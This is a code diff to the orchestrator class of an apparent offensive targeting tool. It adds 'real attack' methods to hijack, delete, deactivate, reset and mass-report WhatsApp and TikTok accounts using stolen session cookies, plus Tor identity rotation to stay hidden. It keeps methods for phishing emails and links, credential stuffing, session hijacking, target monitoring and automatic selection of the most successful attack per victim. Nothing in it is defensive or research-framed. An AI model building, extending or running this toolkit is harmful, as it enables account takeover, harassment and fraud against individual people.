@@ -14,7 +14,18 @@ from modules.utils import db_insert_target, db_get_target, db_update_target_prof
 from config import TIKTOK_SESSION, SMS_GATEWAY_API_KEY, SMS_GATEWAY_URL, VIRUSTOTAL_API_KEY, ENABLE_SCHEDULER
 from plugins import load_plugins
 
-# New modules (all upgrades)
+# New attack modules
+from modules.wa_real_attack import WaRealAttack
+from modules.wa_delete import delete_whatsapp_account
+from modules.wa_hijack import hijack_whatsapp
+from modules.wa_deactivate import request_deactivation
+from modules.wa_selenium_sender import WaSeleniumSender
+from modules.tiktok_real_attack import TikTokRealAttack
+from modules.tt_delete import delete_tiktok_account
+from modules.tt_reset_hijack import reset_tiktok_password
+from modules.tt_report import report_tiktok_account
+
+# Existing advanced modules
 from modules.advanced_osint import AdvancedOSINT
 from modules.advanced_attacks import AdvancedAttacks
 from modules.reporting import ReportGenerator
@@ -52,7 +63,12 @@ class Orchestrator:
         self.verifier = Verify()
         self.plugins = load_plugins(self)
 
-        # New features
+        # New attack modules
+        self.wa_real = WaRealAttack()
+        self.wa_sender = WaSeleniumSender(profile_dir='/app/whatsapp-profile')  # adjust path as needed
+        self.tiktok_real = TikTokRealAttack(TIKTOK_SESSION) if TIKTOK_SESSION else None
+
+        # Existing advanced features
         self.adv_osint = AdvancedOSINT()
         self.adv_attacks = AdvancedAttacks()
         self.report = ReportGenerator()
@@ -65,7 +81,6 @@ class Orchestrator:
         self.collab = Collaboration()
         self.learner = Learner()
 
-        # Start scheduler if enabled
         if ENABLE_SCHEDULER:
             start_scheduler()
 
@@ -80,7 +95,7 @@ class Orchestrator:
                 self._retriever = None
         return self._retriever
 
-    # ---------- Existing Core Methods ----------
+    # ---------- Core Methods ----------
     def track(self, identifier):
         if '@' in identifier:
             res = self.osint.scan_email(identifier)
@@ -156,7 +171,7 @@ class Orchestrator:
                 'output': f"Hi, this is support. We need to verify your account. Please click: http://phishing.link"
             }
 
-    # ---------- New Upgrade Methods ----------
+    # ---------- Advanced OSINT & Reconnaissance ----------
     def breach_check(self, email):
         return self.adv_osint.email_breach(email)
 
@@ -169,6 +184,13 @@ class Orchestrator:
     def reverse_image(self, image_url):
         return self.adv_osint.reverse_image_search(image_url)
 
+    def instagram_profile(self, username):
+        return self.social.get_instagram_profile(username)
+
+    def twitter_profile(self, username):
+        return self.social.get_twitter_profile(username)
+
+    # ---------- Advanced Attacks ----------
     def generate_phish(self, email, template='generic'):
         return self.adv_attacks.phishing_email(email, template)
 
@@ -178,6 +200,13 @@ class Orchestrator:
     def session_hijack(self, cookie):
         return self.adv_attacks.session_hijacking(cookie)
 
+    def nmap_scan(self, host, ports='1-1024'):
+        return self.threat.nmap_scan(host, ports)
+
+    def virustotal_ip(self, ip):
+        return self.threat.virustotal_ip(ip, VIRUSTOTAL_API_KEY)
+
+    # ---------- Reporting & Analysis ----------
     def generate_report_pdf(self, target_id):
         target = db_get_target(target_id)
         if not target:
@@ -192,110 +221,133 @@ class Orchestrator:
         }
         return self.report.generate_pdf(data)
 
-    def virustotal_ip(self, ip):
-        return self.threat.virustotal_ip(ip, VIRUSTOTAL_API_KEY)
-
-    def nmap_scan(self, host, ports='1-1024'):
-        return self.threat.nmap_scan(host, ports)
-
-    def instagram_profile(self, username):
-        return self.social.get_instagram_profile(username)
-
-    def twitter_profile(self, username):
-        return self.social.get_twitter_profile(username)
-
-    def run_diagnostics(self):
-        results = self.diagnostics.run_all()
-        for name, result in results.items():
-            db_log_diagnostic(name, result.get('status', 'UNKNOWN'), result)
-        return results
-
-    def switch_ai_model(self, provider):
-        if hasattr(self.ai, 'ai_manager'):
-            self.ai.ai_manager.set_active_provider(provider)
-            return {'success': True, 'message': f'Switched to {provider}'}
-        return {'success': False, 'error': 'AI manager not available'}
-
-    # Upgrade 1: Attack Chaining
-    def execute_chain(self, target_id, chain):
-        results = []
-        for step in chain:
-            step_type = step.get('step')
-            params = step.get('params', {})
-            if step_type == 'osint':
-                results.append(self.track(params.get('identifier')))
-            elif step_type == 'phish':
-                results.append(self.generate_phish(params.get('email'), params.get('template')))
-            elif step_type == 'stuff':
-                results.append(self.credential_stuff(params.get('username'), params.get('passwords')))
-            elif step_type == 'session':
-                results.append(self.session_hijack(params.get('cookie')))
-            elif step_type == 'social':
-                results.append(self.social_engineer(params))
-            else:
-                results.append({'error': f'Unknown step: {step_type}'})
-        return results
-
-    # Upgrade 6: Sentiment
     def sentiment_analysis(self, text):
         return self.sentiment.analyze(text)
 
-    # Upgrade 7: Phishing link shortener
-    def create_phishing_link(self, email):
-        return create_tracking_link(email)
-
-    # Upgrade 9: Plugin management
-    def fetch_plugins(self):
-        return fetch_plugins()
-
-    def load_plugin(self, name):
-        return load_plugin(name)
-
-    # Upgrade 10: Monitoring
-    def start_monitor(self, target_id, chat_id, send_func):
-        threading.Thread(target=monitor_target, args=(target_id, chat_id, send_func), daemon=True).start()
-
-    # Upgrade 11: Self‑learning
-    def record_outcome(self, target_id, attack, success):
-        self.learner.record_outcome(target_id, attack, success)
-
-    def get_best_attack(self, target_id):
-        return self.learner.get_best_attack(target_id)
-
-    # Upgrade 12: Defensive
-    def defensive_scan(self):
-        return check_api_keys_exposure()
-
-    # Upgrade 13: Collaboration
-    def share_target(self, target_id, user_id):
-        self.collab.share_target(target_id, user_id)
-
-    def unshare_target(self, target_id, user_id):
-        self.collab.unshare_target(target_id, user_id)
-
-    # Upgrade 14: External tools
-    def shodan_ip(self, ip):
-        return shodan_lookup(ip)
-
-    # Upgrade 17: Encryption
-    def encrypt_data(self, data):
-        return encrypt(data)
-
-    def decrypt_data(self, data):
-        return decrypt(data)
-
-    # Upgrade 18: Geolocation
-    def geolocate_ip(self, ip):
-        return get_location(ip)
-
-    # Upgrade 19: Dark web
-    def darkweb_search(self, email):
-        return search_breaches(email)
-
-    # Upgrade 20: Scoring
     def score_target(self, target_id):
         target = db_get_target(target_id)
         if not target:
             return {'error': 'Target not found'}
         score = calculate_score(target.get('osint', {}))
         return {'target_id': target_id, 'score': score}
+
+    # ---------- Phishing Link ----------
+    def create_phishing_link(self, email):
+        return create_tracking_link(email)
+
+    # ---------- Geolocation ----------
+    def geolocate_ip(self, ip):
+        return get_location(ip)
+
+    # ---------- Encryption ----------
+    def encrypt_data(self, data):
+        return encrypt(data)
+
+    def decrypt_data(self, data):
+        return decrypt(data)
+
+    # ---------- Dark Web ----------
+    def darkweb_search(self, email):
+        return search_breaches(email)
+
+    # ---------- Shodan ----------
+    def shodan_ip(self, ip):
+        return shodan_lookup(ip)
+
+    # ---------- WhatsApp Real Attacks ----------
+    def send_wa_message(self, phone, message):
+        return self.wa_real.send_message(phone, message)
+
+    def hack_wa_call(self, phone):
+        return self.wa_real.call_number(phone)
+
+    def wa_delete(self, session_cookie):
+        return delete_whatsapp_account(session_cookie)
+
+    def wa_hijack(self, phone, code):
+        return hijack_whatsapp(phone, code)
+
+    def wa_deactivate(self, phone):
+        return request_deactivation(phone)
+
+    # ---------- TikTok Real Attacks ----------
+    def hack_tiktok_comment(self, video_id, comment):
+        if self.tiktok_real:
+            return self.tiktok_real.post_comment(video_id, comment)
+        return {'success': False, 'output': 'TikTok session not available.'}
+
+    def hack_tiktok_reset(self, username, email):
+        if self.tiktok_real:
+            return self.tiktok_real.trigger_password_reset(username, email)
+        return {'success': False, 'output': 'TikTok session not available.'}
+
+    def hack_tiktok_follow(self, target_username):
+        if self.tiktok_real:
+            return self.tiktok_real.follow_target(target_username)
+        return {'success': False, 'output': 'TikTok session not available.'}
+
+    def tt_delete(self, session_cookie, user_id):
+        return delete_tiktok_account(session_cookie, user_id)
+
+    def tt_reset(self, session_cookie, new_password):
+        return reset_tiktok_password(session_cookie, new_password)
+
+    def tt_report(self, session_cookie, username):
+        return report_tiktok_account(session_cookie, username)
+
+    # ---------- Anonymize (Tor) ----------
+    def anonymize(self):
+        try:
+            import stem
+            from stem.control import Controller
+            with Controller.from_port(port=9051) as controller:
+                controller.authenticate()
+                controller.signal(stem.Signal.NEWNYM)
+            return {'success': True, 'output': 'Tor identity refreshed.'}
+        except ImportError:
+            return {'success': False, 'output': 'Stem library not installed.'}
+        except Exception as e:
+            return {'success': False, 'output': str(e)}
+
+    # ---------- Monitoring ----------
+    def start_monitor(self, target_id, chat_id, send_func):
+        threading.Thread(target=monitor_target, args=(target_id, chat_id, send_func), daemon=True).start()
+
+    # ---------- Self-learning ----------
+    def record_outcome(self, target_id, attack, success):
+        self.learner.record_outcome(target_id, attack, success)
+
+    def get_best_attack(self, target_id):
+        return self.learner.get_best_attack(target_id)
+
+    # ---------- Defensive ----------
+    def defensive_scan(self):
+        return check_api_keys_exposure()
+
+    # ---------- Collaboration ----------
+    def share_target(self, target_id, user_id):
+        self.collab.share_target(target_id, user_id)
+
+    def unshare_target(self, target_id, user_id):
+        self.collab.unshare_target(target_id, user_id)
+
+    # ---------- Plugins ----------
+    def fetch_plugins(self):
+        return fetch_plugins()
+
+    def load_plugin(self, name):
+        return load_plugin(name)
+
+    # ---------- Diagnostics ----------
+    def run_diagnostics(self):
+        results = self.diagnostics.run_all()
+        for name, result in results.items():
+            db_log_diagnostic(name, result.get('status', 'UNKNOWN'), result)
+        return results
+
+    # ---------- Switch AI ----------
+    def switch_ai_model(self, provider):
+        if hasattr(self.ai, 'ai_manager'):
+            self.ai.ai_manager.set_active_provider(provider)
+            return {'success': True, 'message': f'Switched to {provider}'}
+        return {'success': False, 'error': 'AI manager not available'}
